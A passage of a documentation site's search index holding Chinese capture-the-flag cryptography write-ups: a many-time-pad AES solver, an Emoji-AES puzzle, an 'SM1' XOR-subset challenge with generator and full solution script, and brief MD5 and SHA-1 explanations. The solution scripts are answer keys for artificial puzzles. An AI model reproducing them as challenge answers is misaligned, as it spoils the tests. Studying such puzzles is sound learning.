bUWiB27APHPsqM2qcV/nM8IwDx5xmwExl/atQXGzn/LL4xyqzmyzD+2qMeZqfzcKZWOjoWIX+SycPvc62HAQmsKqZK5ZO2JKq5OeuFEovG9oOcRYve1XStbTQYiocEbQ4XX/c6xE0cm9P/I5NM1Mlr6CT6qt3Pqb/m+7s/kwzww59FKOq5R6HmK7SHCQ6gwTQ1ciGWbJF3NLHuOpe08X4xl/l0tJengSfJRJ39Q9WwZbgBlEPf7NYeMlR9zU9QQxvZ+r4LiaJVYrQYSCcDj37Vk9XVRMijBDWDWFbK5sgkDHQYmwGYiwH4hEAqAAXDNj1/f2eRFbIU2GN6Wfj89fEINJjoG/1O/I5Q8S7tHnlWFQNoXJQ2e4r2Aca9RPLVCWz7Nq96YUKBRN3afW/9FSwWLLvjsBptQmoRj4FwmJzJf7Vj6KCOkm6mdaZ4l6FB4/E2Lk9aopD7Q473leULPM1CydXWme/8WKUqEucDwraXS57+Z+iGRMvQ8MABtZboAVFK2B1mzNL4Ba/bxVE4puy4HwvQI+N1tKmeMf99FfR13IA0y+FWL3eCzXKw8gimaJCW1e3QJJWDorDXRRjExeokMGGHzOd8MrTfNNFGWSPqZRTdGJxW7wOWQi3bHT0WSqP1fBpdU9m+WKHIxy57dL/8JFJJ97R56P76rlToRrM825JcTBEfrK0Nb9Q+2RI83vyTA2UxH9s9cSnWd+e7nacrfXjV7EjkGHgblEGHX9LqNETaZpBAL0NG9OAJ0+f+6id4/Ixcee0jx4b8k5xvblujFEdK0q2MRo2uTxSAFMpelt8JY0EZbnF9uT88N4LPms3cNeKBt0KBhx+vshFKMc/b3W7OMCo6m7EyzmcTmMe+Y6CO0x0FF0p6h1bTnJu3MMok1hO27iBSfYusHgKWVmKpgNHjiDfuBYnuBCysa+hHQZW23zxNRqi2OGAy6zCGPOY4E4nyUA6g/jlVOjq6fFv1VHN1tlQlBOCvB9r5B0os1zI2XL/Mlb9eggNuA8nw2igDm+9qkBtLxOXojAGDonAPzBagHXnVd+0kLdUGEoddt45A2fgSSociCx4tVDMd5ag1zR4VxdADAy0lnmW0n8noAT5y60SV7gICvMOphILBRjk365Mu6GNA3C+n8k5YH9sRnS7Z5EVEKdSeYigJs4XNavD50/paKnJcux2l3gzm/1aTUMzLd8tw7vZuUWv1XaYULcez8ieEMeACETyN53+RlcPQefupgszELvwlKz0prl5ydHCPOA7+ZS2zfUZOEmRSBNaIZUCd5euNg+HXMeFa/Qb452+KKEjq7vRthC4hH9gluaYMl/eXboQvvVu4xDhfVW403enI7sxdMR3t2WO1cOaLE8IN5c71W+IqhaRbJ/Prlo/pk/XAtMvimZxIN4y5/oP5vQ/lCt5jM9wAtPKSoQbJxWIYWNrXVfkZUOOwD2tlOmyxMCcKFr8921JHgtWqcYliElNX19hzmYhow+19EV3zhITzsGOX/PP1BHIKz/NJyKcGqx1hlfrDfDVedhJWkQL9sg4clbfguprs3KG5YNbbjclaK9JoEboBY3EGBGHtsWfmIRAREwy1a53y/a/NUDLaQxrMsyV/YnbiyBevGjMVNnqIY5T0YtPLL/s5Wvmq7EU9qoMDIlaosCf616TagcZalGFQumL15q6wx3FxwVB5EAjFa/MKnZNc0CqbFhXgEevp1ZXRnjEAdSK99gyAmwVawWpxIWXZQvQ5w7tIQ+nF8utoG4ab/AdLbZyKCtT8pxjiHifNcCCkLfew8Qq9S2JnrhCUMs9SEiRrLZHiE9JVlwbUJzAQjCM6G4tdeLNEApqDv4eZ7zh2U9K2+Gk9OjBgSk5xMjRkCzKCrNAKgRLoJ1Gu8L4T9LSBp1juhUsyaIaK'\n\n    # \u5904\u7406 Base64 \u586b\u5145\n    key = base64.b64decode(key_base64 + b'=' * ((4 - len(key_base64) % 4) % 4))\n    c = base64.b64decode(encrypted_data_base64 + b'=' * ((4 - len(encrypted_data_base64) % 4) % 4))\n\n    # \u521b\u5efa AES \u89e3\u5bc6\u5668\n    cipher = AES.new(key, AES.MODE_ECB)\n\n    # \u5206\u5757\u89e3\u5bc6\uff0c\u56e0\u4e3a\u539f\u59cb\u7684\u7b97\u6cd5\u6bcf\u5757\u90fd\u8981\u4e0e\u524d\u9762\u7ed3\u679c\u5f02\u6216\uff0c\u6240\u4ee5\u9700\u8981\u5206\u5757\u89e3\u5bc6\uff0c\u867d\u7136\u8fd9\u65f6\u5019\u4e0d\u662f\u6700\u7ec8\u660e\u6587\uff0c\u4f46\u8ddf\u660e\u6587\u6709\u76f8\u4f3c\u6027\n    decrypted_blocks = decrypt_blocks(cipher, c)\n\n    # \u6267\u884c MTP \u653b\u51fb\u63a8\u65ad\n    msg = mtp_attack(c, decrypted_blocks)\n\n    # \u8f93\u51fa\u6700\u7ec8\u89e3\u5bc6\u7ed3\u679c\n    print(''.join([''.join([chr(c) for c in row]) for row in msg]))\n\n# \u6267\u884c\u4e3b\u7a0b\u5e8f\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"Crypto/Chapter11/11-2/","title":"Emoji-AES \u89e3\u5bc6","text":""},{"location":"Crypto/Chapter11/11-2/#emoji-aes-\u89e3\u5bc6","title":"Emoji-AES \u89e3\u5bc6","text":"<p>\u6253\u5361\u6587\u4ef6</p> <p></p> <p>LOLCODE \u662f\u4e00\u79cd\u8bd9\u8c10\u5e7d\u9ed8\u7684 \u602a\u8bde\u578b\u7f16\u7a0b\u8bed\u8a00\uff08Esoteric Programming Language\uff09\uff0c\u8bde\u751f\u4e8e 2007 \u5e74\uff0c\u7531 Adam Lindsay \u8bbe\u8ba1\u3002\u7075\u611f\u6765\u6e90\u4e8e\u65e9\u671f\u4e92\u8054\u7f51\u6d41\u884c\u7684 LOLCats \u6587\u5316\uff0c\u90a3\u79cd\u7528\u6ed1\u7a3d\u9519\u8bef\u82f1\u8bed\uff08Engrish\uff09\u5199\u51fa\u6765\u7684\u8ff7\u56e0\u56fe\uff0c\u5982 \u201cI CAN HAS CHEEZBURGER?\u201d\u3002</p> <p>\u8fd9\u95e8\u8bed\u8a00\u672c\u8d28\u662f\u4e3a\u4e86\u641e\u7b11\uff0c\u8bed\u8a00\u7ed3\u6784\u6a21\u4eff\u8fd9\u79cd\u201c\u732b\u8bed+\u9519\u522b\u5b57+\u7f51\u6c11\u9ed1\u8bdd\u201d\uff0c\u4e0d\u5177\u5907\u5b9e\u7528\u6027\uff0c\u4f46\u5177\u5907\u5b8c\u6574\u7684\u7f16\u7a0b\u8bed\u6cd5\u7279\u5f81</p> \u529f\u80fd C\u8bed\u8a00\u5199\u6cd5 LOLCODE \u5199\u6cd5 \u5b9a\u4e49\u53d8\u91cf <code>int x = 5;</code> <code>I HAS A X ITZ 5</code> \u8f93\u51fa <code>printf(\"hi\");</code> <code>VISIBLE \"hi\"</code> \u6761\u4ef6 <code>if ... else</code> <code>O RLY? YA RLY NO WAI</code> \u5faa\u73af <code>while</code> <code>IM IN YR LOOP ... IM OUTTA YR LOOP</code> \u8f93\u5165 <code>scanf</code> <code>GIMMEH VAR</code> <p>\u89e3\u5bc6\u5f97\u5230 Key</p> <p></p> <p>\u89e3\u538b\u7f29\u5305\u5f97\u5230 1.docx\uff0c\u5185\u5bb9\u63d0\u793a AES\uff0c\u65e0\u5176\u4ed6\u5185\u5bb9\uff0c\u5c1d\u8bd5\u5c06 docx \u4fee\u6539\u6210 .zip \u89e3\u538b\u53d1\u73b0 fllllllllll1ag.txt</p> <p></p> <p>Emoji \u7b26\u53f7\u52a0\u4e0a\u4e4b\u524d\u63d0\u793a\u7684 AES\uff0c\u731c\u6d4b\u4e3a Emoji-AES\uff0cKey \u7ee7\u7eed\u731c\u6d4b\u4e3a\u4e4b\u524d\u7684 Key\uff0c\u6709\u70b9\u5c0f\u8111\u6d1e Rotation=4</p> <p></p> <p></p>"},{"location":"Crypto/Chapter12/12-1/","title":"SM1","text":""},{"location":"Crypto/Chapter12/12-1/#sm1","title":"SM1","text":"<p>SM1 \u7684\u57fa\u672c\u7279\u6027\uff1a</p> <ul> <li>\u7b97\u6cd5\u7c7b\u578b\uff1a\u5bf9\u79f0\u5206\u7ec4\u52a0\u5bc6\u7b97\u6cd5</li> <li>\u5bc6\u94a5\u957f\u5ea6\uff1a128 \u4f4d</li> <li>\u5206\u7ec4\u957f\u5ea6\uff1a128 \u4f4d</li> <li>\u5b89\u5168\u5f3a\u5ea6\uff1a\u4e0e\u56fd\u9645\u6807\u51c6 AES \u76f8\u5f53</li> <li>\u516c\u5f00\u6027\uff1a\u7b97\u6cd5\u672a\u516c\u5f00\uff0c\u4ec5\u4ee5 IP \u6838\u5f62\u5f0f\u5b58\u5728\u4e8e\u82af\u7247\u4e2d\uff0c\u9700\u901a\u8fc7\u52a0\u5bc6\u82af\u7247\u63a5\u53e3\u8c03\u7528</li> </ul> <p>\u5e94\u7528\u573a\u666f\uff1a</p> <p>\u7531\u4e8e SM1 \u7684\u9ad8\u5b89\u5168\u6027\u548c\u786c\u4ef6\u5b9e\u73b0\u7279\u6027\uff0c\u5b83\u88ab\u5e7f\u6cdb\u5e94\u7528\u4e8e\u4ee5\u4e0b\u9886\u57df\uff1a</p> <ul> <li>\u7535\u5b50\u653f\u52a1\uff1a\u5982\u56fd\u5bb6\u653f\u52a1\u901a\u3001\u8b66\u52a1\u901a\u7b49\u7cfb\u7edf</li> <li>\u7535\u5b50\u5546\u52a1\uff1a\u4fdd\u969c\u4ea4\u6613\u6570\u636e\u7684\u5b89\u5168\u4f20\u8f93</li> <li>\u91d1\u878d\u7cfb\u7edf\uff1a\u7528\u4e8e\u6838\u5fc3\u4e1a\u52a1\u7cfb\u7edf\u7684\u6570\u636e\u52a0\u5bc6</li> <li>\u5d4c\u5165\u5f0f\u8bbe\u5907\uff1a\u5982\u667a\u80fd IC \u5361\u3001\u52a0\u5bc6\u5361\u3001\u52a0\u5bc6\u673a\u7b49\u5b89\u5168\u4ea7\u54c1</li> </ul> <p>\u4e0b\u8f7d\u9644\u4ef6</p> <pre><code>from Crypto.Util.number import getPrime,long_to_bytes,bytes_to_long\nfrom Crypto.Cipher import AES\nimport hashlib\nfrom random import randint\ndef gen512num():\n    # \u751f\u6210 [1, 512] \u7684\u4e71\u5e8f\u6392\u5217\uff0c\u7528\u4e8e\u7ed9\u540e\u7eed\u751f\u6210\u7d20\u6570\u65f6\u6253\u4e71\u987a\u5e8f\n    order=[]\n    while len(order)!=512:\n        tmp=randint(1,512)\n        if tmp not in order:\n            order.append(tmp)\n    ps=[]\n    for i in range(512):\n        p=getPrime(512-order[i]+10)     # # \u6bcf\u4e2a\u7d20\u6570 p \u662f 512 - order[i] + 10 \u4f4d\u7684\n        pre=bin(p)[2:][0:(512-order[i])]+\"1\"    # \u7136\u540e\u4ece p \u7684\u4e8c\u8fdb\u5236\u4e2d\u622a\u53d6\u524d 512 - order[i] \u4f4d + 1\n        ps.append(int(pre+\"0\"*(512-len(pre)),2))    # \u5c06 pre \u8865\u9f50\u81f3 512 \u4f4d\uff0c\u8f6c\u6362\u4e3a\u6574\u6570\u540e\u6dfb\u52a0\u5230\u5217\u8868 ps \u4e2d\n    return ps\n\ndef run():\n    choose=getPrime(512)    # \u4f7f\u7528 getPrime(512) \u751f\u6210\u4e00\u4e2a 512 \u4f4d\u7684\u7d20\u6570 choose\n    ps=gen512num()          # \u751f\u6210\u4f2a\u7d20\u6570\u5e8f\u5217 ps[0..511]\n    print \"gen over\"\n    bchoose=bin(choose)[2:]     # \u5c06 choose \u8f6c\u4e3a 512 \u4f4d\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\n    r=0\n    bchoose = \"0\"*(512-len(bchoose))+bchoose\\\n    # \u904d\u5386\u5176\u6bcf\u4e00\u4f4d\uff1a\u82e5\u662f 1\uff0c\u5c31\u5c06\u5bf9\u5e94\u7684 ps[i] \u52a0\u5165\u5f02\u6216\u603b\u548c\n    for i in range(512):\n        if bchoose[i]=='1':\n            r=r^ps[i]\n    flag=open(\"flag\",\"r\").read()\n\n    # \u4f7f\u7528 choose \u53d6 MD5 \u5f97\u5230 128-bit\uff0816 \u5b57\u8282\uff09AES \u5bc6\u94a5\n    key=long_to_bytes(int(hashlib.md5(long_to_bytes(choose)).hexdigest(),16))\n    aes_obj = AES.new(key, AES.MODE_ECB)    # \u7136\u540e\u7528\u8fd9\u4e2a\u5bc6\u94a5 ECB \u6a21\u5f0f\u52a0\u5bc6 flag\uff08\u9700\u4e3a16\u5b57\u8282\u5bf9\u9f50\uff09\n    ef=aes_obj.encrypt(flag).encode(\"base64\")   # \u52a0\u5bc6\u7ed3\u679c\u4ee5 base64 \u7f16\u7801\u5199\u5165\u6587\u4ef6\n\n    open(\"r\", \"w\").write(str(r))\n    open(\"ef\",\"w\").write(ef)\n    gg=\"\"\n    for p in ps:\n        gg+=str(p)+\"\\n\"\n    open(\"ps\",\"w\").write(gg)\n\nrun()\n</code></pre> <p>\u89e3\u9898\u4ee3\u7801\uff1a</p> <pre><code>import os\nimport base64\n\n# \u8bfb\u53d6\u6587\u4ef6 \"r\" \u7684\u5185\u5bb9\uff0c\u4ee5\u5b57\u7b26\u4e32\u5f62\u5f0f\u5b58\u50a8\u5728\u53d8\u91cf r \u4e2d\nr = open(r\"D:\\\u9898\u76ee\\f951511fcecd414288d0fd21bcafae7b\\r\", \"r\").read()\n# \u8bfb\u53d6\u6587\u4ef6 \"ef\" \u7684\u5185\u5bb9\uff0c\u4ee5\u5b57\u7b26\u4e32\u5f62\u5f0f\u5b58\u50a8\u5728\u53d8\u91cf ef \u4e2d\nef = open(r\"D:\\\u9898\u76ee\\f951511fcecd414288d0fd21bcafae7b\\ef\", \"r\").read()\n# \u8bfb\u53d6\u6587\u4ef6 \"ps\" \u7684\u6240\u6709\u884c\u5185\u5bb9\uff0c\u4ee5\u5217\u8868\u5f62\u5f0f\u5b58\u50a8\u5728\u53d8\u91cf ps \u4e2d\uff0c\u6bcf\u4e2a\u5143\u7d20\u662f\u6587\u4ef6\u4e2d\u7684\u4e00\u884c\u5b57\u7b26\u4e32\nps = open(r\"D:\\\u9898\u76ee\\f951511fcecd414288d0fd21bcafae7b\\ps\").readlines()\n\n# \u6253\u5370\u6587\u4ef6 \"ef\" \u8bfb\u53d6\u5230\u7684\u539f\u59cb\u5185\u5bb9\uff08\u5b57\u7b26\u4e32\u5f62\u5f0f\uff09\nprint(ef)\n# \u5bf9\u6587\u4ef6 \"ef\" \u8bfb\u53d6\u5230\u7684\u5185\u5bb9\u8fdb\u884c base64 \u89e3\u7801\uff0c\u5f97\u5230\u5b57\u8282\u4e32\u5f62\u5f0f\u7684\u5185\u5bb9\nef = base64.b64decode(ef)\n# \u6253\u5370 base64 \u89e3\u7801\u540e\u7684\u6587\u4ef6 \"ef\" \u7684\u5185\u5bb9\uff08\u5b57\u8282\u4e32\u5f62\u5f0f\uff09\nprint(ef)\n\n# \u904d\u5386\u6587\u4ef6 \"ps\" \u8bfb\u53d6\u5230\u7684\u6bcf\u4e00\u884c\u5185\u5bb9\uff08\u5b57\u7b26\u4e32\uff09\nfor k in ps:\n    # \u5224\u65ad\u5f53\u524d\u884c\u5185\u5bb9\u8f6c\u6362\u4e3a\u6574\u6570\u540e\u4e8c\u8fdb\u5236\u8868\u793a\u7684\u5012\u6570\u7b2c\u4e09\u4f4d\u662f\u5426\u4e3a '1'\n    if (bin(int(k, 10))[-3] == '1'):\n        # \u5982\u679c\u662f\uff0c\u6253\u5370\u5f53\u524d\u884c\u5185\u5bb9\u8f6c\u6362\u4e3a\u6574\u6570\u540e\u7684\u4e8c\u8fdb\u5236\u8868\u793a\n        print(bin(int(k, 10)))\n# \u6253\u5370\u53d8\u91cf r \u8f6c\u6362\u4e3a\u6574\u6570\u540e\u7684\u4e8c\u8fdb\u5236\u8868\u793a\nprint(bin(int(r, 10)))\n\npsre = []\n# \u518d\u6b21\u904d\u5386\u6587\u4ef6 \"ps\" \u8bfb\u53d6\u5230\u7684\u6bcf\u4e00\u884c\u5185\u5bb9\uff08\u5b57\u7b26\u4e32\uff09\nfor k in ps:\n    # \u5c06\u5f53\u524d\u884c\u5185\u5bb9\u8f6c\u6362\u4e3a\u6574\u6570\uff0c\u518d\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\uff0c\u5b58\u50a8\u5230\u5217\u8868 psre \u4e2d\n    t = bin(int(k, 10))\n    psre.append(t)\n\nl = []\n# \u904d\u5386\u5217\u8868 psre \u4e2d\u7684\u6bcf\u4e2a\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\nfor i in psre:\n    # \u67e5\u627e\u5f53\u524d\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u4e2d\u6700\u540e\u4e00\u4e2a '1' \u7684\u7d22\u5f15\u4f4d\u7f6e\n    index = i.rfind('1')\n    # \u5982\u679c\u8be5\u7d22\u5f15\u4f4d\u7f6e\u4e0d\u5728\u5217\u8868 l \u4e2d\n    if index not in l:\n        # \u5c06\u8be5\u7d22\u5f15\u4f4d\u7f6e\u6dfb\u52a0\u5230\u5217\u8868 l \u4e2d\n        l.append(index)\n    else:\n        # \u5982\u679c\u8be5\u7d22\u5f15\u4f4d\u7f6e\u5df2\u5b58\u5728\u4e8e\u5217\u8868 l \u4e2d\uff0c\u6253\u5370\u9519\u8bef\u4fe1\u606f\u548c\u8be5\u7d22\u5f15\u4f4d\u7f6e\n        print('error')\n        print(i.rfind('1'))\n\n# \u521b\u5efa\u4e00\u4e2a\u957f\u5ea6\u4e3a 512 \u7684\u5217\u8868 bchoose\uff0c\u6240\u6709\u5143\u7d20\u521d\u59cb\u5316\u4e3a 0\nbchoose = [0 for _ in range(512)]\n# \u6253\u5370\u5217\u8868 bchoose\nprint(bchoose)\n\n# \u5c06\u53d8\u91cf r \u8f6c\u6362\u4e3a\u6574\u6570\uff0c\u5b58\u50a8\u5728\u53d8\u91cf r2 \u4e2d\nr2 = int(r, 10)\n# \u5faa\u73af 512 \u6b21\nfor i in range(512):\n    # \u5c06\u53d8\u91cf r2 \u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\n    rre = bin(r2)\n    # \u5728\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u524d\u8865 '0'\uff0c\u4f7f\u5176\u957f\u5ea6\u4e3a 512\n    rre = '0' * (512 - len(rre)) + rre\n    # \u53d6\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u7684\u5012\u6570\u7b2c i+1 \u4f4d\u5b57\u7b26\n    ii = rre[-i - 1]\n    # \u5982\u679c\u8be5\u5b57\u7b26\u4e3a '1' \u6216\u8005\u7b49\u4e8e 1\uff08\u8fd9\u91cc\u5224\u65ad\u7b49\u4e8e 1 \u53ef\u80fd\u6709\u8bef\uff0c\u5b57\u7b26\u4e0d\u4f1a\u7b49\u4e8e\u6574\u6570 1\uff09\n    if (ii == '1' or ii == 1):\n        # \u6784\u9020\u4e00\u4e2a\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\uff0c\u5f00\u5934\u4e3a '1'\uff0c\u540e\u9762\u8ddf i \u4e2a '0'\n        sub = '1' + '0' * i\n        # \u904d\u5386 512 \u6b21\n        for z in range(512):\n            # \u5982\u679c\u5217\u8868 psre \u4e2d\u7b2c z \u4e2a\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u7684\u5012\u6570\u7b2c i+1 \u4f4d\u53ca\u4ee5\u540e\u7684\u90e8\u5206\u7b49\u4e8e sub\n            if psre[z][-i - 1:] == sub:\n                # \u5c06\u5217\u8868 bchoose \u4e2d\u7b2c z \u4e2a\u5143\u7d20\u8bbe\u7f6e\u4e3a 1\n                bchoose[z] = 1\n                # \u5c06\u53d8\u91cf r2 \u4e0e\u5217\u8868 ps \u4e2d\u7b2c z \u4e2a\u5143\u7d20\u8f6c\u6362\u4e3a\u6574\u6570\u540e\u8fdb\u884c\u5f02\u6216\u64cd\u4f5c\uff0c\u5e76\u66f4\u65b0 r2\n                r2 = r2 ^ int(ps[z], 10)\n                # \u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u5c31\u8df3\u51fa\u5185\u5c42\u5faa\u73af\n                break\n# \u6253\u5370\u5217\u8868 bchoose\nprint(bchoose)\ni = 0\n# \u904d\u5386 512 \u6b21\nfor k in range(512):\n    # \u5982\u679c\u5217\u8868 bchoose \u4e2d\u7b2c k \u4e2a\u5143\u7d20\u4e3a 1\n    if bchoose[k] == 1:\n        # \u5c06\u53d8\u91cf i \u4e0e\u5217\u8868 ps \u4e2d\u7b2c k \u4e2a\u5143\u7d20\u8f6c\u6362\u4e3a\u6574\u6570\u540e\u8fdb\u884c\u5f02\u6216\u64cd\u4f5c\uff0c\u5e76\u66f4\u65b0 i\n        i = i ^ int(ps[k], 10)\n# \u6253\u5370\u5224\u65ad i \u662f\u5426\u7b49\u4e8e\u53d8\u91cf r \u8f6c\u6362\u4e3a\u6574\u6570\u540e\u7684\u7ed3\u679c\nprint(i == int(r, 10))\n# \u6253\u5370\u53d8\u91cf i \u7684\u4e8c\u8fdb\u5236\u8868\u793a\nprint(bin(i))\n# \u6253\u5370\u53d8\u91cf r \u8f6c\u6362\u4e3a\u6574\u6570\u540e\u7684\u4e8c\u8fdb\u5236\u8868\u793a\nprint(bin(int(r, 10)))\nchoose = 0\n# \u5faa\u73af 512 \u6b21\nfor i in range(512):\n    # \u5c06 choose \u4e58\u4ee5 2 \u518d\u52a0\u4e0a\u5217\u8868 bchoose \u4e2d\u7b2c i \u4e2a\u5143\u7d20\u7684\u503c\uff0c\u66f4\u65b0 choose\n    choose = choose * 2 + bchoose[i]\n# \u6253\u5370\u53d8\u91cf choose\nprint(choose)\n\nfrom Crypto.Util.number import getPrime, long_to_bytes, bytes_to_long\nfrom Crypto.Cipher import AES\nimport hashlib\nfrom random import randint\n# \u5c06\u53d8\u91cf choose \u8f6c\u6362\u4e3a\u5b57\u8282\u4e32\uff0c\u8ba1\u7b97\u5176 MD5 \u54c8\u5e0c\u503c\uff0c\u518d\u5c06\u54c8\u5e0c\u503c\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u6574\u6570\uff0c\u6700\u540e\u8f6c\u6362\u4e3a\u5b57\u8282\u4e32\u4f5c\u4e3a AES \u5bc6\u94a5\nkey = long_to_bytes(int(hashlib.md5(long_to_bytes(choose)).hexdigest(), 16))\n# \u4f7f\u7528\u5bc6\u94a5\u548c ECB \u6a21\u5f0f\u521b\u5efa AES \u52a0\u5bc6\u5bf9\u8c61\naes_obj = AES.new(key, AES.MODE_ECB)\n# \u4f7f\u7528 AES \u5bf9\u8c61\u5bf9\u4e4b\u524d base64 \u89e3\u7801\u540e\u7684\u5185\u5bb9 ef \u8fdb\u884c\u89e3\u5bc6\nflag = aes_obj.decrypt(ef)\n# \u6253\u5370\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\nprint(flag)\n</code></pre>"},{"location":"Crypto/Chapter2/2-1/","title":"MD5","text":""},{"location":"Crypto/Chapter2/2-1/#md5","title":"MD5","text":"<pre><code>\u586b\u5145\uff1a\u9996\u5148\uff0cMD5 \u4f1a\u5bf9\u8f93\u5165\u6570\u636e\u8fdb\u884c\u586b\u5145\uff0c\u4f7f\u5176\u957f\u5ea6\u6ee1\u8db3\u8981\u6c42\u3002\u586b\u5145\u89c4\u5219\u662f\uff0c\u9996\u5148\u6dfb\u52a0\u4e00\u4e2a 1\uff0c\u7136\u540e\u6dfb\u52a0\u82e5\u5e72\u4e2a 0\uff0c\u76f4\u5230\u6570\u636e\u7684\u957f\u5ea6\u4e3a 448 \u4f4d\uff08\u5373\u9664\u53bb\u957f\u5ea6\u4fe1\u606f\u540e\uff0c\u5269\u4f59\u7684\u6bd4\u7279\u6570\u662f 448\uff09\u3002\u63a5\u4e0b\u6765\uff0c\u586b\u5145\u6570\u636e\u4f1a\u6dfb\u52a0\u4e00\u4e2a 64 \u4f4d\u7684\u6570\u5b57\uff0c\u8fd9\u4e2a\u6570\u5b57\u8868\u793a\u539f\u59cb\u6570\u636e\u7684\u957f\u5ea6\uff08\u4ee5\u6bd4\u7279\u4e3a\u5355\u4f4d\uff09\n\n\u5206\u5757\uff1a\u586b\u5145\u540e\u7684\u6570\u636e\u88ab\u5206\u4e3a 512 \u4f4d\uff0864 \u5b57\u8282\uff09\u7684\u4e00\u5757\u4e00\u5757\u5730\u5904\u7406\n\n\u521d\u59cb\u5316 MD5 \u7f13\u51b2\u533a\uff1a\u521d\u59cb\u5316 MD5 \u7b97\u6cd5\u4e2d\u7684\u7f13\u51b2\u533a\uff0c\u5b9a\u4e49\u4e86 4 \u4e2a 32 \u4f4d\u7684\u53d8\u91cf\uff08A\u3001B\u3001C\u3001D\uff09\uff0c\u8fd9\u4e9b\u53d8\u91cf\u5c06\u6700\u7ec8\u51b3\u5b9a\u54c8\u5e0c\u503c\n\n\u5904\u7406\u6570\u636e\u5757\uff1a\u6bcf\u6b21\u5904\u7406\u4e00\u4e2a 512 \u4f4d\u7684\u6570\u636e\u5757\uff0c\u8fdb\u884c\u4e00\u7cfb\u5217\u590d\u6742\u7684\u8fd0\u7b97\uff0c\u5305\u62ec\u975e\u7ebf\u6027\u51fd\u6570\u7684\u8ba1\u7b97\u3001\u4e0e\u4e0a\u4e00\u6b65\u8f93\u51fa\u7684\u7ed3\u679c\u8fdb\u884c\u8fed\u4ee3\u3001\u548c\u5e38\u91cf\u503c\u76f8\u52a0\u7b49\n\n\u8f93\u51fa\u54c8\u5e0c\u503c\uff1a\u7ecf\u8fc7\u6240\u6709\u6570\u636e\u5757\u7684\u5904\u7406\uff0c\u6700\u540e\u7684 4 \u4e2a 32 \u4f4d\u53d8\u91cf\u5c31\u6784\u6210\u4e86 MD5 \u8f93\u51fa\u7684\u54c8\u5e0c\u503c\uff08128 \u4f4d\uff09\u3002\u8fd9\u4e2a\u54c8\u5e0c\u503c\u901a\u5e38\u4f1a\u4ee5 32 \u4e2a\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u7684\u5f62\u5f0f\u663e\u793a\n</code></pre> <p>MD5 \u7684\u7279\u70b9:\uff1a</p> <pre><code>16 \u4f4d\u6216\u8005 32 \u4f4d\u7684\u5b57\u7b26\uff0c\u7531\u5b57\u6bcd\u548c\u6570\u5b57\u7ec4\u6210\uff0c\u5b57\u6bcd\u5927\u5c0f\u5199\u7edf\u4e00\n</code></pre> <p></p>"},{"location":"Crypto/Chapter2/2-2/","title":"SHA-1","text":""},{"location":"Crypto/Chapter2/2-2/#sha-1","title":"SHA-1","text":"<p>SHA-1 \u52a0\u5bc6\u6d41\u7a0b</p> <ol> <li> <p>\u586b\u5145\u6d88\u606f\uff08Padding\uff09</p> </li> <li> <p>\u539f\u59cb\u6d88\u606f\u4f1a\u88ab\u586b\u5145\uff0c\u4f7f\u5f97\u603b\u957f\u5ea6\u662f 512 \u7684\u500d\u6570</p> </li> <li> <p>\u4f1a\u5728\u6d88\u606f\u540e\u9762\u52a0\u4e0a <code>1</code> bit\uff0c\u7136\u540e\u8865 <code>0</code>\uff0c\u6700\u540e\u52a0\u4e0a\u539f\u59cb\u6d88\u606f\u957f\u5ea6\uff0864 bit \u8868\u793a\uff09</p> </li> <li> <p>\u8fd9\u662f\u4e3a\u4e86\u8ba9\u7b97\u6cd5\u53ef\u4ee5\u5206\u5757\u5904\u7406</p> </li> <li> <p>\u5206\u5757\u5904\u7406</p> </li> <li> <p>\u5c06\u586b\u5145\u540e\u7684\u6d88\u606f\u5212\u5206\u4e3a\u591a\u4e2a 512 \u4f4d\u5757</p> </li> <li> <p>\u6bcf\u4e2a\u5757\u5c06\u88ab\u62c6\u5206\u4e3a 16 \u4e2a 32-bit \u7684\u5b50\u5757</p> </li> <li> <p>\u521d\u59cb\u5316\u5e38\u91cf\uff085 \u4e2a 32-bit \u5bc4\u5b58\u5668\uff09</p> </li> <li> <p>\u4f7f\u7528 5 \u4e2a\u56fa\u5b9a\u7684\u521d\u59cb\u54c8\u5e0c\u503c\uff1a</p> <pre><code>h0 = 0x67452301\nh1 = 0xEFCDAB89\nh2 = 0x98BADCFE\nh3 = 0x10325476\nh4 = 0xC3D2E1F0\n</code></pre> </li> <li> <p>\u4e3b\u5faa\u73af\uff0880 \u6b21\u64cd\u4f5c\uff09</p> </li> <li> <p>\u5bf9\u6bcf\u4e2a 512-bit \u5757\uff0c\u6267\u884c 80 \u6b21\u7684\u4f4d\u8fd0\u7b97\u548c\u903b\u8f91\u8fd0\u7b97\uff08\u5982 AND\u3001OR\u3001XOR\u3001\u79fb\u4f4d\u3001\u52a0\u6cd5\uff09\uff1a</p> <ul> <li>\u6bcf 20 \u6b21\u5206\u4e3a\u4e00\u7ec4\uff0c\u5171 4 \u7ec4\uff1b</li> <li>\u6bcf\u7ec4\u4f7f\u7528\u4e0d\u540c\u7684\u903b\u8f91\u51fd\u6570 <code>f(t)</code> \u548c\u5e38\u91cf <code>k(t)</code></li> </ul> </li> <li> <p>\u6bcf\u6b21\u8fed\u4ee3\u4f1a\u66f4\u65b0 5 \u4e2a\u54c8\u5e0c\u5bc4\u5b58\u5668\u7684\u503c</p> </li> <li> <p>\u5408\u5e76\u7ed3\u679c</p> </li> <li>\u6700\u7ec8\uff0c5 \u4e2a\u54c8\u5e0c\u5bc4\u5b58\u5668\u7684\u503c\u62fc\u63a5\u8d77\u6765\uff0c\u5f97\u5230 160 \u4f4d\uff0820 \u5b57\u8282\uff09\u7684\u54c8\u5e0c\u503c\uff0c\u5373 SHA-1 \u8f93\u51fa</li> </ol> <p>SHA-1 \u52a0\u5bc6\u7279\u70b9:</p> <pre><code>\u4e0d\u7ba1\u8f93\u5165\u591a\u957f\uff0c\u8f93\u51fa\u603b\u662f 160 